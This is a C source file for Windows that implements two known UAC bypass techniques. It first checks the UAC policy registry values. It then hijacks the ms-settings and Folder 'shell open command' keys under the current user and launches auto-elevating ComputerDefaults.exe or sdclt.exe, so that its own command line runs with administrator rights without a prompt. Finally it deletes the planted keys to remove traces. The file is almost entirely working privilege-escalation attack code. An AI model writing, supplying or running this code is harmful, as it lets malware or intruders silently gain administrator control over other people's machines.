#include <Windows.h>
#include <stdio.h>
#include <stdlib.h>

LPCWSTR configKey = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
LPCWSTR msSettingKey = L"SOFTWARE\\Classes\\ms-settings\\Shell\\Open\\command";
LPCWSTR sdcltKey = L"SOFTWARE\\Classes\\Folder\\Shell\\Open\\command";

VOID ReadConfig(LPWSTR regValue, DWORD *pvData) 
{
	DWORD bufferSize = sizeof(pvData);
	LONG err = RegGetValueW(HKEY_LOCAL_MACHINE, configKey, regValue, RRF_RT_REG_DWORD, NULL, pvData, &bufferSize);

	if (err != ERROR_SUCCESS) 
	{
		wprintf(L"Error getting value: %x\n", err);
	}
}

BOOL IsValidConfig()
{
	DWORD consentPromptBehaviorAdmin = 0;
	PDWORD pCPBA = &consentPromptBehaviorAdmin;

	DWORD enableLUA = 0;
	PDWORD pEnableLUA = &enableLUA;

	ReadConfig(L"ConsentPromptBehaviorAdmin", pCPBA);
	ReadConfig(L"EnableLUA", pEnableLUA);

	return consentPromptBehaviorAdmin != 2 && enableLUA == 1;
}

VOID CleanRegistry()
{
	HKEY hKeyMsSettings;
	LSTATUS rMss = RegOpenKeyExW(HKEY_CURRENT_USER, msSettingKey, 0, KEY_ALL_ACCESS, &hKeyMsSettings);
	if (rMss == ERROR_SUCCESS) {
		LSTATUS delRegMSSettings = RegDeleteKey(HKEY_CURRENT_USER, msSettingKey);

		if (delRegMSSettings != ERROR_SUCCESS) {
			printf("Error deleting key: %d\n", delRegMSSettings);
		}
	}

	HKEY hKeySdclt;
	LSTATUS rSdc = RegOpenKeyExW(HKEY_CURRENT_USER, msSettingKey, 0, KEY_ALL_ACCESS, &hKeySdclt);
	if (rSdc == ERROR_SUCCESS) {
		LSTATUS delRegSdclt = RegDeleteKey(HKEY_CURRENT_USER, sdcltKey);

		if (delRegSdclt != ERROR_SUCCESS) {
			printf("Error deleting key: %d\n", delRegSdclt);
		}
	}
}

VOID BypassUsingComputerDefaults()
{
    HKEY hKey;
    LONG openRes = RegCreateKeyExW(HKEY_CURRENT_USER, msSettingKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY| KEY_READ | KEY_SET_VALUE, NULL, &hKey, NULL);

    if (openRes != ERROR_SUCCESS) {
		printf("Error creating key: %d\n", openRes);
    }

	LPWSTR fileName = GetCommandLine();

	LONG degExec = RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (LPBYTE)"", 1);
	LONG dftVal = RegSetValueExW(hKey, NULL, 0, REG_SZ, (LPBYTE)fileName, (lstrlenW(fileName) + 1) * sizeof(WCHAR));

	if (degExec != ERROR_SUCCESS || dftVal != ERROR_SUCCESS) {
		printf("Error writing to Registry\n");
	}

	ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\ComputerDefaults.exe", NULL, NULL, SW_SHOWDEFAULT);
}

VOID BypassUsingSDCLT()
{
	HKEY hKey;
	LONG openRes = RegCreateKeyExW(HKEY_CURRENT_USER, sdcltKey, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_CREATE_SUB_KEY | KEY_READ | KEY_SET_VALUE, NULL, &hKey, NULL);

	if (openRes != ERROR_SUCCESS) {
		printf("Error creating key: %d\n", openRes);
	}

	LPWSTR fileName = GetCommandLine();

	LONG degExec = RegSetValueExW(hKey, L"DelegateExecute", 0, REG_SZ, (LPBYTE)"", 1);
	LONG dftVal = RegSetValueExW(hKey, NULL, 0, REG_SZ, (LPBYTE)fileName, (lstrlenW(fileName) + 1) * sizeof(WCHAR));

	if (degExec != ERROR_SUCCESS || dftVal != ERROR_SUCCESS) {
		printf("Error writing to Registry\n");
	}

	ShellExecute(NULL, L"open", L"C:\\Windows\\System32\\sdclt.exe", NULL, NULL, SW_SHOWDEFAULT);
}
